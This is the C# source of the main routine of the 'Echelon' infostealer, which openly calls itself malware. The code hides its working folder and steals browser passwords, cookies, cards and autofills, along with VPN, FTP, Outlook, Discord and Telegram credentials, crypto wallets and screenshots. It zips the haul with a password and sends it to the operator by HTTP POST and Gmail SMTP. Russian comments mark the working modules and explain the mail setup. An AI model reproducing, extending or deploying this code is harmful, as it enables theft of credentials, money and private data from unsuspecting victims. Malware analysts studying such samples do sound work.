///////////////////////////////////////////////////////
////Echelon Stealler, C# Malware Systems by MadСod ////
///////////////////Telegram: @madcod///////////////////
///////////////////////////////////////////////////////

using Ionic.Zip;
using Ionic.Zlib;
using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading;


namespace Echelon
{

    public static class Stealer
    {
        [STAThread]
        public static void GetStealer()
        {
            // Создаем временные директории для сбора лога
            Directory.CreateDirectory(Help.Echelon_Dir);
            Directory.CreateDirectory(Help.Browsers);
            Directory.CreateDirectory(Help.Passwords);
            Directory.CreateDirectory(Help.Autofills);
            Directory.CreateDirectory(Help.Downloads);
            Directory.CreateDirectory(Help.Cookies);
            Directory.CreateDirectory(Help.History);
            Directory.CreateDirectory(Help.Cards);

            //Скрываем временную папку
            File.SetAttributes(Help.dir, FileAttributes.Directory | FileAttributes.Hidden | FileAttributes.System);



            // Запускаем граббер файлов в отдельном потоке
            GetFiles.Inizialize(Help.Echelon_Dir);
            Thread.Sleep(new Random(Environment.TickCount).Next(10000, 20000));

            // Chromium
            new Thread(() =>
            {
            Chromium.GetCookies(Help.Cookies);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetPasswords(Help.Passwords);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetAutofills(Help.Autofills);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetDownloads(Help.Downloads);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetHistory(Help.History);
            }).Start();

            new Thread(() =>
            {
            Chromium.GetCards(Help.Cards);
            }).Start();

            new Thread(() =>
            {
            // Mozilla
            Steal.Cookies();
            }).Start();

            new Thread(() =>
            {
                Steal.Passwords();
            }).Start();

            new Thread(() =>
            {
                ProtonVPN.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                Outlook.GrabOutlook(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                OpenVPN.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                NordVPN.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                Startjabbers.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                TGrabber.Start(Help.Echelon_Dir);
            }).Start();
            new Thread(() =>
            {
                DGrabber.Start(Help.Echelon_Dir);
            }).Start();
            Screenshot.Start(Help.Echelon_Dir);
            BuffBoard.Inizialize(Help.Echelon_Dir);
            Systemsinfo.ProgProc(Help.Echelon_Dir);
            FileZilla.Start(Help.Echelon_Dir);
            TotalCommander.Start(Help.Echelon_Dir);
            StartWallets.Start(Help.Echelon_Dir);
            DomainDetect.Start(Help.Browsers);

            // Пакуем в апхив с паролем
            string zipName = Help.dir + "\\" + Help.DateLog + "_" + Help.HWID + Help.CountryCOde() + ".zip";
            using (ZipFile zip = new ZipFile(Encoding.GetEncoding("cp866"))) // Устанавливаем кодировку
            {
                zip.CompressionLevel = CompressionLevel.BestCompression; // Задаем максимальную степень сжатия 
                zip.Comment = "Echelon Stealer by @madcod Log. <Build v3.0>" +
                       "\n|----------------------------------------|" +
                       "\nPC:" + Environment.MachineName + "/" + Environment.UserName +
                       "\nIP: " + Help.IP + Help.Country() +
                       "\nHWID: " + Help.DateLog + "_" + Help.HWID
                    ;
                zip.Password = Program.passwordzip; // Задаём пароль
                zip.AddDirectory(@"" + Help.Echelon_Dir); // Кладем в архив содержимое папки с логом
                zip.Save(@"" + zipName); // Сохраняем архив    
            }


            string LOG = @"" + zipName;
            byte[] file = File.ReadAllBytes(LOG);
            string url = string.Concat(new string[]
            {
                    
                    "👤 "+Environment.MachineName+"/" + Environment.UserName+
                    "\n🏴 IP: " +Help.IP+  Help.Country() +
                    "\n🌐 Browsers Data"  +
                    "\n   ∟🔑"+ (Chromium.Passwords + Edge.count + Steal.count)+
                    "\n   ∟🍪"+ (Chromium.Cookies + Steal.count_cookies) +
                    "\n   ∟🕑"+ Chromium.History +
                    "\n   ∟📝"+ Chromium.Autofills+
                    "\n   ∟💳"+ Chromium.CC+
                    "\n💶 <h3>Wallets: </h3>"  + (StartWallets.count > 0 ? "✅" : "❌")+
                    (Electrum.count > 0 ? "<h3> Electrum</h3>" : "") +
                    (Armory.count > 0 ? " <h3>Armory</h3>" : "") +
                    (AtomicWallet.count > 0 ? "<h3> Atomic</h3>" : "") +
                    (BitcoinCore.count > 0 ? " <h3>BitcoinCore</h3>" : "") +
                    (Bytecoin.count > 0 ? " <h3>Bytecoin</h3>" : "") +
                    (DashCore.count > 0 ? " <h3>DashCore</h3>" : "") +
                    (Ethereum.count > 0 ? " <h3>Ethereum</h3>" : "") +
                    (Exodus.count > 0 ? " <h3>Exodus</h3>" : "") +
                    (LitecoinCore.count > 0 ? "<h3> LitecoinCore</h3>" : "") +
                    (Monero.count > 0 ? "<h3> Monero</h3>" : "") +
                    (Zcash.count > 0 ? "<h3> Zcash</h3>" : "") +
                    (Jaxx.count > 0 ? " <h3>Jaxx</h3>" : "") + 

                    //

                    "\n📂 <h3>FileGrabber:</h3> "   + GetFiles.count + //Работает
                    "\n💬 <h3>Discord:</h3> "  + (DGrabber.count > 0 ? "✅" : "❌") + //Работает
                    "\n✈️ <h3>Telegram: </h3>"  + (TGrabber.count > 0 ? "✅" : "❌") + //Работает
                    "\n💡 <h3>Jabber: </h3>" + (Startjabbers.count + Pidgin.PidginCount > 0 ? "✅" : "❌")+
                    (Pidgin.PidginCount > 0 ? " Pidgin ("+Pidgin.PidginAkks+")" : "")+
                    (Startjabbers.count > 0 ? " Psi" : "") + //Работает

                    "\n📡 <h3>FTP" +
                    "\n   ∟ <h3>FileZilla:</h3> " + (FileZilla.count > 0 ? "✅" + " ("+FileZilla.count+")" : "❌") + //Работает
                    "\n   ∟ <h3>TotalCmd:</h3> " + (TotalCommander.count > 0 ? "✅" : "❌") + //Работает
                    "\n🔌 VPN" +
                    "\n   ∟ <h3>NordVPN:</h3> "  + (NordVPN.count > 0 ? "✅" : "❌") + //Работает
                    "\n   ∟ <h3>OpenVPN:</h3> "  + (OpenVPN.count > 0 ? "✅" : "❌") + //Работает
                    "\n   ∟ <h3>ProtonVPN:</h3> "  + (ProtonVPN.count > 0 ? "✅" : "❌") + //Работает
                    "\n🆔 HWID: " + Help.HWID + //Работает
                    "\n⚙️ " + Systemsinfo.GetOSInformation() +
                    "\n🔎 " + File.ReadAllText(Help.Browsers + "\\DomainDetect.txt")
        });


            
            SenderAPI.POST(file, LOG, "application/x-ms-dos-executable", url);
            

            //Записываем HWID в файл, означает что лог с данного ПК уже отправлялся и больше слать его не надо.
            File.AppendAllText(Help.LocalData + "\\" + Help.HWID, Help.HWID);
            
                //пишем письмо с инфой и архивом не забудьте в настройках гугла вкллючить почту для неизвестных приложений
                MailAddress from = new MailAddress("от кого", "Log");
                MailAddress to = new MailAddress("кому");
                MailMessage m = new MailMessage(from, to)
                {
                    Subject = "Loоg",
                    Body = url,
                    IsBodyHtml = true
                };
                SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587)
                {
                    Credentials = new NetworkCredential("почта", "пароль от почты вашей"),
                    EnableSsl = true
                };
                m.Attachments.Add(new Attachment(zipName));
                smtp.Send(m);
                //Directory.Delete(Help.dir + "\\", true);

            
            
                //Directory.Delete(Help.dir + "\\", true);
            
                
            
            

        }
    }
}
